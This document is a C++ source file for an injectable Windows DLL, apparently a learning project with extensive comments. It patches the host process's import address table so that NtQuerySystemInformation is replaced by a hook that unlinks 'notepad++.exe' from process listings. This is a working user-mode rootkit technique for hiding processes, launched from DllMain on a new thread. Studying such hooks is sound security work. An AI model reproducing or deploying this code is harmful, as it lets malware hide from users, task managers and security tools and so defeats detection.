#include<windows.h>
#include<TlHelp32.h>
#include<Psapi.h>
#include<winternl.h>
#include<cstdio> //! for sprintf
#include<iostream>

//defines and typredefs
#define STATUS_SUCCESS  ((NTSTATUS)0X00000000L)
#define SIH_ERR_INVALID_HEADER  0x00000001
#define SIH_STATUS_SUCCESS   0X00000000


typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
	ULONG NextEntryOffset; //! ULONG - 32 bit unsigned integer(unsigned LoNG)
	ULONG NumberOfThreads;
	LARGE_INTEGER Reserved[3]; //! union to store signed 64 bit integer for both x86/64 compiler
	LARGE_INTEGER CreatTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	ULONG BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromprocessId;
}MY_SYSTEM_PROCESS_INFORMATION, * PMY_SYSTEM_PROCESS_INFORMATION;

//! Nt_Query_System_Information function signature prototype typedef

typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
	);

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation =
(PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");

//! Hook Function Implementation

NTSTATUS WINAPI HookedNtQuerySystemInformation(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
)
{
	//!Hooked NtQuerySystemInformation to chenge the parameters and returns changed structure
	//! This function changes the SYSTEM_PROCESS_INFORMATION using 2nd parameter SystemInformation
	//! If System_process_information value is passed as first parameter for enum System_Inforamtion_class:
	//! IT Returns an array of SYSTEM_PROCESS_INFORMATION structures, one for each process
	//! running in the system.These structures contain information about the resource usage of each process,
	//!  including the number of threads and handles used by the process, the peak page - file usage,
	//!  and the number of memory pages that the process has allocated.
	//!
	NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	//!When the SystemInformationClass parameter is SystemProcessInformation, the buffer pointed to by the SystemInformation parameter contains a SYSTEM_PROCESS_INFORMATION structure for each process
	if (SystemInformationClass == SystemProcessInformation && status == STATUS_SUCCESS)
	{
		// Loop through the list of processes
		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL; //! SPI struct pointer variable assigned null
		PMY_SYSTEM_PROCESS_INFORMATION pNext =
			(PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation; //! SPI struct pointer variable sent as 2nd parameter to the function

		do
		{
			//! Now pCurrent variable is assigned value of pointer to SPI sent as 2nd parameter i.e argument passed into the function
			pCurrent = pNext;

			//?!The start of the next item in the array is the address of the previous item plus the value in the NextEntryOffset member. For the last item in the array, NextEntryOffset is 0. as per MSDN
			//! pNext value is changed/assigned to point to next entry offset or address of next structure, by accessing the SPI structure member--> NextEntryOffset
			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

			//! Checks if the next image name is the name of module we are trying to hide
			//! ImageName member contains the process's image name.
			if (!wcsncmp(pNext->ImageName.Buffer, L"notepad++.exe", pNext->ImageName.Length))
			{
				//!if here means that next structure image name  matches the desired process module
				//! For the last item in the array, NextEntryOffset is 0. which Means we have reached process-list end
				//!This statement checks if  structure pNext with matched process name is last
				if (!pNext->NextEntryOffset)
				{
					//! If the process structure pNext with matched/desired proceess name is last structure
					//! we set its previous/Back-link or structure before pNext which is  pCurrent (current node of SPI*)to be the last
					//! This will stop the traversal of List ahead to further look for next matching process-name SPI struct
					pCurrent->NextEntryOffset = 0;

				}
				else
				{
					//! IF NEXT ENTRY IS NOT LAST
					//!If the next process struct which is matching  desired process module is not the last struct
					//! In array of process-info structures as shown by Non-null member NextEntryOffset
					//! We will set the structure* pCurrent(struct which is before matched process-name struct)-> NextEntryOffset member  to point to NextentryOffset member of the next struture to it( pNext->NextEntryOffset) which is the one with matched process image name
					//? SO NOW the process-info structure just before the matched structure name i.e pCurrent will have NextEntryOffset member which wiil be same as that of the  matched process-info memeber(pNext->NextEntryOffest.
					//todo This will probably make the current process-info structure's Next entry(one before matched/desired process name) to SKIP the matched name module(pNext); and point to process-info structure after it
					pCurrent->NextEntryOffset += pNext->NextEntryOffset; //! Skips and hides the SPI* structure in traversal which is mactching the desired process image name

				}
				//! The SPI* structure which is matching the found Image name (pNext) is set to the one Before it(pCurrent)
				//todo More understanding and explanation for this step
				pNext = pCurrent;

			}

		} while (pCurrent->NextEntryOffset != 0);

	}

	return status;
}

//! Import address table hook after parsing TILL IMAGE_THUNK_DATA structures of IMAGE_IMPORT_DESCRIPTOR in IMAGE_DIRECTORY_ENTRY_IMPORT entry of DATA_directories in Optional header
//x DWORD StartIATHook()
DWORD WINAPI StartIATHook(HMODULE hInsDll)

{
	//!AllocConsole shifted here
	AllocConsole(); // To allocate console for logging
	FILE* f;
	freopen_s(&f, "CONOUT$", "w", stdout);
	std::cout << "Test0\n";
	MODULEINFO modInfo{}; //! Initialize module info struct for GetModuleInformation'

	HMODULE hModule = GetModuleHandle(0);//!parameter NULL, GetModuleHandle returns a handle to the file used to create the calling process (.exe file).
	//x 1std::cout << std::hex << hModule << '\n';
	//! find the Base address of current calling process,purpose same as GetProcessAddress() using CreteTlHelp32_snapshot
	//! alternatively could have been done by finding LDR_DATA_TABLE_ENTRY struct
	//! then finding base address from its member same as in syscall_dumper project
	std::cout << "Test1:hModule(base adress) of parentProcess: " << std::hex << hModule << "\n";
	//?? Below step is not required as it gives same
	GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));
	//xchar szAddress[64];
	std::cout << "Test2\n";
	//! Find Import directory
	LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pAddress;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((LPBYTE)pDosHeader + pDosHeader->e_lfanew);
	std::cout << "Test3:pAddress" << std::hex << pAddress << "\n";
	//! Invalid File Exit
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE || pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		//x 2 MessageBox(NULL, "FAIL", "FAIL", MB_OK);
		std::cout << "Correct Dos Header or Nt_header signature not found.\n";
		//x 6return SIH_ERR_INVALID_HEADER;
	}
	std::cout << "Test4 \n";
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
	//! There is no separate IMAGE_IMPORT_DIRECTORY
	//! IMAGE_DIRECTORY_ENTRY_IMPORT virtualaddress field is a RVA to array of IMAGE_IMPORT_DESCRIPTOR structures
	//! IF RVA points to array of structures the individual field of array structures are called DESCRIPTORS
	//xPIMAGE_ pImportDirectory = (PIMAGE_IMPORT_DIRECTORY)((LPBYTE)pDosHeader+pNtHeader->OptionalHeader.DataDirectory)
	std::cout << "Test5 \n";
	PIMAGE_IMPORT_DESCRIPTOR pImageImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pDosHeader + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); //! This points to first entry of IMAGE_IMPORT_DESCRIPTOR in array
	std::cout << "Test6: import descriptor array address" << std::hex << pImageImportDesc << '\n';
	//! Find ntdll.dll
	//! Name field is RVA poiniting to specific name of Dll from which Imports are taken
	char* importModulename = (char*)((LPBYTE)pDosHeader + pImageImportDesc->Name);

	std::cout << "Test7 " << importModulename << "\n";
	//! pIMAGE_IMPORT_DESCRIPTOR->Characteristics is a field of union at start which is 0 for terminating NULL import descriptor
	//! This is being used as conditional check termination statement for traversal in for LOOP
	for (; pImageImportDesc->Characteristics; ++pImageImportDesc)
	{
		//! If the Import-descriptor specifies import from module named "ntdll.dll" will break out of LOOP as correct IMPORT_DESCRIPTOR found
		//x main change::if (importModulename == "kernel32.dll")
		if (!strcmp("ntdll.dll", (char*)(pAddress + pImageImportDesc->Name)))
		{
			importModulename = (char*)((LPBYTE)pDosHeader + pImageImportDesc->Name); //! importmoduleName has to be re-assigned here to get the current parsing module name
			std::cout << "Test8::image import descriptor array parsed:: " << importModulename << " found \n"; //!this should always come Test 8 showld pass
			break;
		}
	}

	std::cout << "Test9 " << importModulename << "\n";
	//! search for import of NtQuerySystemInformation
	//! IMAGE_THUNK_DATA is a struct which holds only one UNION
	PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)pDosHeader + pImageImportDesc->OriginalFirstThunk); //! This is basically unbound/unresolved IMPORT name- table  called INT;OriginalFirstThunk union (poiniting to struct PIMAGE_IMPORT_BY_NAME named as AddressOfData)
	PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)pDosHeader + pImageImportDesc->FirstThunk);//! RVA to IAT after loader resolves import, Initially it is same as OriginalFirstThunk union (poiniting to struct PIMAGE_IMPORT_BY_NAME named as AddressOfData) but later points to u1.Functions field(which is imported function addrs)

	PIMAGE_IMPORT_BY_NAME pAddressOfData = nullptr; //! field of union of PIMAGE_THUNK_DATA structures in INT or unresolved IAT
//! !(pOriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) -->> This line checks that fucntion is not imporetd by ordinal
//todo 	IMAGE_ORDINAL_FLAG defined as hex number which might become 0 if functions are imported by ordinals
//! 	It should only be imported by name with PIMAGE_IMPORT_BY_NAME field (AddressOfData) non- null
	for (; !(pOriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pOriginalFirstThunk->u1.AddressOfData; ++pOriginalFirstThunk)
	{
		//Assign  pAddressOfData with real value (IMAGE_IMPORT_BY_NAME field of IMAGE_THUNK_DATA structures
		//! u1.AddresofData is a RVA to IMAGE_IMPORT_BY_NAME field from baseAddress
		pAddressOfData = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)pDosHeader + pOriginalFirstThunk->u1.AddressOfData);
		//
		if ((strcmp("NtQuerySystemInformation", (char*)(pAddressOfData->Name))) == 0)
			break;
		++pFirstThunk;
	}
	//! this will give original addreess of function in IAT hooked dll 
	std::cout << std::hex << "Original unhooked address of: " << pAddressOfData->Name << "      " << pFirstThunk->u1.Function << '\n';


	//!IAT Hooking will be done only by simple overwriting function pointer in pFirstThunk (IMAGE_THUNK_DATA) structture
	DWORD dwOldProtect = NULL;
	DWORD dwOldProtect1 = NULL;
	VirtualProtect((LPVOID) & (pFirstThunk->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &dwOldProtect);
	pFirstThunk->u1.Function = (uintptr_t)(&HookedNtQuerySystemInformation);
	VirtualProtect((LPVOID) & (pFirstThunk->u1.Function), sizeof(uintptr_t), dwOldProtect, &dwOldProtect1);
	//! this will give final hooked  addreess of function in IAT hooked dll 
	std::cout << std::hex << "Hooked-address of: " << pAddressOfData->Name << "      " << pFirstThunk->u1.Function << '\n';
	//x5char szAddress[64];
	//x4sprintf_s(szAddress, "%s   0x%I64X", (char*)pAddressOfData->Name, pFirstThunk->u1.Function);
	 //! If here means everThing ok

	//x 3 MessageBox(NULL, szAddress, "TEST", MB_OK);

	//CloseHandle(hModule);
	//x 7return SIH_STATUS_SUCCESS;
	getchar();
	return 0; //! ThreadProc fuction StartIATHook must return some value
}

BOOL  WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		//x StartIATHook();
		//? IF calling StartIatHook() directly in case DLL_PROCESS_ATTACH and not using CreateThread in DLlMain\\ to start it as ThreadProc function\\
		//?In that case Then It becomes difficult to debug the dll using VS 2022 or any other debugger if StartIatHook is having any mistake and not running properly\\
		//?In that case the whole process will crash and injection of Dll will not work properly leading to crash of original process
		//! Always use CreateThread function to start execution of called function in any custom dll to be injected inside process
		::DisableThreadLibraryCalls(hInstance);
		CreateThread(nullptr, 0, LPTHREAD_START_ROUTINE(StartIATHook), hInstance, 0, nullptr);
		break;
	}

	return TRUE;
}


